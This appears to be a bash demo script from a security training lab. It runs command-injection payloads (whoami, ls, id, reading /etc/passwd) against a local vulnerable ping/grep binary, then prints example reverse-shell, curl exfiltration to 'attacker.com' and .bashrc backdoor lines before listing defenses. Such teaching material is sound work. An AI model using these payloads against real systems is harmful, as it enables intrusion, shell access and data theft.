#!/bin/bash
# Demo: Command Injection Exploitation
# This script demonstrates command injection vulnerabilities

set -e

BINARY="./command-injection/cmd_injection"
DEMO_NAME="Command Injection"

echo "========================================"
echo "  $DEMO_NAME Demo"
echo "========================================"
echo ""

# Check if binary exists
if [ ! -f "$BINARY" ]; then
    echo "Error: Binary not found. Run 'make all' first."
    exit 1
fi

echo "Step 1: Setup Test Environment"
echo "-------------------------------"
echo "Creating test file..."
$BINARY setup
echo ""

echo "Step 2: Normal Usage"
echo "--------------------"
echo "Legitimate ping command:"
echo "Running: $BINARY ping localhost"
$BINARY ping "localhost" 2>&1 | head -10
echo ""

echo "Step 3: Understanding the Vulnerability"
echo "----------------------------------------"
echo "The application uses system() to execute commands:"
echo "  system(\"ping -c 1 \" + user_input)"
echo ""
echo "Shell metacharacters allow command injection:"
echo "  ; - Command separator"
echo "  && - AND operator (run if previous succeeds)"
echo "  || - OR operator (run if previous fails)"
echo "  | - Pipe output to another command"
echo "  \` - Command substitution"
echo "  \$() - Command substitution"
echo ""

echo "Step 4: Basic Command Injection"
echo "--------------------------------"
echo "Injecting 'whoami' command:"
echo "Running: $BINARY ping \"localhost; whoami\""
$BINARY ping "localhost; whoami" 2>&1 | tail -5
echo ""

echo "Step 5: Directory Listing"
echo "-------------------------"
echo "Listing directory contents:"
echo "Running: $BINARY ping \"localhost && ls -la\""
$BINARY ping "localhost && ls -la" 2>&1 | tail -10
echo ""

echo "Step 6: Reading Sensitive Files"
echo "--------------------------------"
echo "Reading /etc/passwd (requires permissions):"
echo "Running: $BINARY ping \"localhost; cat /etc/passwd | head -5\""
$BINARY ping "localhost; cat /etc/passwd | head -5" 2>&1 | tail -8
echo ""

echo "Step 7: Multiple Command Chaining"
echo "----------------------------------"
echo "Chaining multiple commands:"
echo "Running: $BINARY ping \"localhost; id; uname -a\""
$BINARY ping "localhost; id; uname -a" 2>&1 | tail -6
echo ""

echo "Step 8: Grep Injection"
echo "----------------------"
echo "The grep command is also vulnerable:"
echo "Running: $BINARY grep \"SECRET\" \"/tmp/test.txt; id\""
$BINARY grep "SECRET" "/tmp/test.txt; id" 2>&1
echo ""

echo "Step 9: Real-World Attack Scenarios"
echo "------------------------------------"
echo "1. Reverse Shell (DEMONSTRATION ONLY - DO NOT RUN):"
echo "   $BINARY ping \"localhost; nc -e /bin/sh attacker.com 4444\""
echo ""
echo "2. Data Exfiltration:"
echo "   $BINARY ping \"localhost; curl http://attacker.com/\\\$(whoami)\""
echo ""
echo "3. Privilege Escalation:"
echo "   $BINARY ping \"localhost; sudo -l\""
echo ""
echo "4. Backdoor Installation:"
echo "   $BINARY ping \"localhost; echo 'backdoor' >> ~/.bashrc\""
echo ""

echo "Step 10: Defense Mechanisms"
echo "---------------------------"
echo "To prevent command injection:"
echo ""
echo "  1. Input Validation:"
echo "     • Whitelist allowed characters"
echo "     • Reject shell metacharacters"
echo "     • Use regex to validate format"
echo ""
echo "  2. Use Safe APIs:"
echo "     • execve() instead of system()"
echo "     • Parameterized commands"
echo "     • Library functions (e.g., ping libraries)"
echo ""
echo "  3. Sandboxing:"
echo "     • Run in restricted environment"
echo "     • Use containers/VMs"
echo "     • Apply principle of least privilege"
echo ""
echo "  4. Escaping:"
echo "     • Properly escape user input"
echo "     • Use language-specific escape functions"
echo ""

echo "Step 11: Learning Objectives"
echo "----------------------------"
echo "✓ Identify command injection vulnerabilities"
echo "✓ Exploit using shell metacharacters"
echo "✓ Chain multiple commands"
echo "✓ Understand attack vectors"
echo "✓ Learn defensive programming"
echo ""

echo "Step 12: Advanced Techniques"
echo "----------------------------"
echo "• Blind command injection (no output)"
echo "• Time-based detection (sleep commands)"
echo "• Out-of-band data exfiltration"
echo "• Bypassing filters and WAFs"
echo "• Exploiting different injection points"
echo ""

echo "========================================"
echo "  Demo Complete!"
echo "========================================"
echo ""
echo "Remember: Use these techniques only in"
echo "authorized environments for learning!"
